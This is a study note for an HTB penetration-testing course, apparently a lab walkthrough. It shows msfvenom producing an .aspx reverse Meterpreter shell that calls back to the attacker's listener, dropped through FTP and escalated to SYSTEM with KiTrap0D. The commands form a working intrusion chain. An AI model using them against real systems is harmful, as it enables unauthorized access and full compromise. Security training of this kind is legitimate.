### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - MSFvenom <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Introduction to MSFvenom



`msfvenom` = `msfpayload` + `msfencode` merged (post-2015). Generates payloads in any output format with optional encoding + bad-char stripping in one shot. Useful when you need a standalone payload to drop on a target out-of-band.

Scenario flow — find an FTP write that lands in a web-served dir, drop an `.aspx`/`.php` shell, trigger via HTTP, catch the reverse shell.

Scan the target:

```diff
+ $ nmap -sV -T4 -p- 10.10.10.5
```

Test FTP anonymous access:

```diff
+ $ ftp 10.10.10.5
+ ftp> ls
```

Generate the payload — `.aspx` reverse Meterpreter:

```diff
+ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```

Common msfvenom flags:

| Flag | Purpose |
|---|---|
| `-p` | Payload (e.g. `windows/meterpreter/reverse_tcp`) |
| `LHOST=` / `LPORT=` | Listener config |
| `-f` | Output format (`exe`, `aspx`, `php`, `py`, `raw`, `c`, `psh`, `js`, etc.) |
| `-o` | Output file (alternative to `>`) |
| `-a` | Architecture (`x86`, `x64`, etc.) |
| `--platform` | Target platform |
| `-b` | Bad characters to avoid (e.g. `"\x00\x0a"`) |
| `-e` | Encoder (e.g. `x86/shikata_ga_nai`) |
| `-i` | Encoder iterations |
| `-x` | Use a template executable |
| `-k` | Keep the template's original behavior (run payload in separate thread) |

Catch the shell with `multi/handler`:

```diff
+ $ msfconsole -q
+ msf6 > use multi/handler
+ msf6 exploit(multi/handler) > set LHOST 10.10.14.5
+ msf6 exploit(multi/handler) > set LPORT 1337
+ msf6 exploit(multi/handler) > run
```

Trigger by visiting `http://10.10.10.5/reverse_shell.aspx` — page renders blank, payload runs in background.

Run the local exploit suggester for privesc on the new session:

```diff
+ msf6 > use post/multi/recon/local_exploit_suggester
+ msf6 post(...) > set SESSION 2
+ msf6 post(...) > run
```

Pivot to a privilege escalation exploit (e.g. KiTrap0D for old Win):

```diff
+ msf6 > use exploit/windows/local/ms10_015_kitrap0d
+ msf6 exploit(...) > set SESSION 3
+ msf6 exploit(...) > set LPORT 1338
+ msf6 exploit(...) > run
```

Result: new Meterpreter session running as `NT AUTHORITY\SYSTEM`.
